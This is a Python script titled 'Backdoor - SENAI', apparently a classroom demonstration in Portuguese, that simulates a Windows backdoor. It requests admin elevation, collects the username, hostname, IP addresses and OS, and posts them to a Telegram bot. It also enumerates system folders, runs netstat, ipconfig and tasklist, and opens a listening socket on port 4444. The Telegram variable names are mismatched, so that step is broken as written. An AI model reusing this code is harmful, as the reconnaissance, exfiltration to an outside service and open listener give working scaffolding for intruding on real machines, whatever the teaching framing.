import os
import sys
import socket
import requests
import ctypes
import psutil
import tkinter as tk
from tkinter import messagebox, scrolledtext
import subprocess
import threading

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

# Configuração do backdoor
PORTA_BACKDOOR = 4444
NOME_ARQUIVO_TXT = "relatorio_backdoor.txt"

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        detalhes = (
            f"=== DETALHES DO SISTEMA ===\n"
            f"👤 Usuário: {usuario}\n"
            f"💻 Host: {hostname}\n"
            f"🌐 IPs: {' | '.join(ips)}\n"
            f"🖥️ Sistema Operacional: {sistema}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def salvar_relatorio_txt(conteudo):
    """
    Salva as informações em um arquivo .txt para visualização.
    """
    try:
        with open(NOME_ARQUIVO_TXT, "w", encoding="utf-8") as arquivo:
            arquivo.write(conteudo)
        print(f"Relatório salvo em: {os.path.abspath(NOME_ARQUIVO_TXT)}")
    except Exception as e:
        print(f"Erro ao salvar relatório: {e}")

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Backdoor '{nome_arquivo}' foi executado!</b>\n"
        f"📂 Localização: {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 1
            )
            os._exit(0)
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up estilo retro perguntando se o arquivo explicativo foi lido.
    """
    root = tk.Tk()
    root.withdraw()
    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )
        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")

def abrir_cmd_com_netstat(porta):
    """
    Abre o CMD como administrador e executa o comando para verificar a porta.
    """
    try:
        comando = f'netstat -an | find "{porta}"'
        args = f'/k {comando}'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", args, None, 1)
    except Exception as e:
        print(f"Erro ao abrir CMD com comando netstat: {e}")

def iniciar_backdoor():
    """
    Simula um backdoor, abre uma porta e exibe ações em uma interface gráfica.
    """
    conteudo_relatorio = []

    def executar_comandos(output_widget):
        try:
            # Adiciona informações gerais ao relatório
            detalhes = obter_detalhes_sistema()
            conteudo_relatorio.append(detalhes + "\n\n")

            # Simula exploração de pastas críticas
            pastas_criticas = ["C:/Windows/System32/drivers/etc", "C:/Users/Public", "C:/ProgramData"]
            for pasta in pastas_criticas:
                log = f"\n📂 Explorando pasta: {pasta}\n"
                conteudo_relatorio.append(log)
                output_widget.insert(tk.END, log)
                if os.path.exists(pasta):
                    for item in os.listdir(pasta):
                        log_item = f"   - {item}\n"
                        conteudo_relatorio.append(log_item)
                        output_widget.insert(tk.END, log_item)
                else:
                    conteudo_relatorio.append(f"   - Pasta não encontrada: {pasta}\n")
                    output_widget.insert(tk.END, f"   - Pasta não encontrada: {pasta}\n")
                output_widget.see(tk.END)

            # Simula execução de comandos críticos
            comandos_simulados = [
                ("netstat -an", "Verificando conexões de rede ativas (possível identificar comunicação maliciosa)."),
                ("ipconfig", "Obtendo informações de rede (endereços IP, gateways)."),
                ("tasklist", "Listando processos em execução (possível identificar antivírus ou outros alvos).")
            ]
            for comando, descricao in comandos_simulados:
                log_comando = f"\nExecutando comando: {comando}\nDescrição: {descricao}\n"
                conteudo_relatorio.append(log_comando)
                output_widget.insert(tk.END, log_comando)
                resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
                conteudo_relatorio.append(resultado.stdout + "\n")
                output_widget.insert(tk.END, resultado.stdout)
                output_widget.see(tk.END)

            # Configura o backdoor (porta aberta)
            try:
                servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                servidor.bind(("0.0.0.0", PORTA_BACKDOOR))
                servidor.listen(5)
                log_porta = (
                    f"\n=== PORTA ABERTA ===\n"
                    f"Porta aberta localmente: {PORTA_BACKDOOR}\n"
                    f"Impacto: Um hacker pode enviar comandos remotamente para manipular este sistema.\n"
                    f"Comando para verificar a porta aberta pelo CMD como Admin: netstat -an | find \"{PORTA_BACKDOOR}\"\n"
                )
                conteudo_relatorio.append(log_porta)
                output_widget.insert(tk.END, log_porta)
                output_widget.see(tk.END)

                # Manter o servidor ativo por um tempo para garantir abertura da porta
                threading.Thread(target=servidor.accept).start()
            except Exception as e:
                log_erro = f"\nErro ao abrir a porta {PORTA_BACKDOOR}: {e}\n"
                conteudo_relatorio.append(log_erro)
                output_widget.insert(tk.END, log_erro)
                output_widget.see(tk.END)

            # Salva o relatório
            salvar_relatorio_txt("".join(conteudo_relatorio))

            # Abre o CMD automaticamente
            abrir_cmd_com_netstat(PORTA_BACKDOOR)

            # Exibe mensagem final para o aluno
            output_widget.insert(tk.END, "\n=== CONCLUÍDO ===\n")
            output_widget.insert(tk.END, f"Relatório salvo em: {os.path.abspath(NOME_ARQUIVO_TXT)}\n")
            output_widget.see(tk.END)
        except Exception as e:
            output_widget.insert(tk.END, f"Erro ao iniciar backdoor: {e}\n")
            output_widget.see(tk.END)

    root = tk.Tk()
    root.title("Backdoor - SENAI")
    root.geometry("800x500")

    text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 10))
    text_area.pack(expand=True, fill=tk.BOTH)

    threading.Thread(target=executar_comandos, args=(text_area,)).start()

    root.mainloop()

if __name__ == "__main__":
    escalar_privilegios()
    nome_arquivo = os.path.basename(sys.argv[0])
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"

    if exibir_popup(txt_correspondente):
        enviar_alerta_arquivo(nome_arquivo)
        iniciar_backdoor()
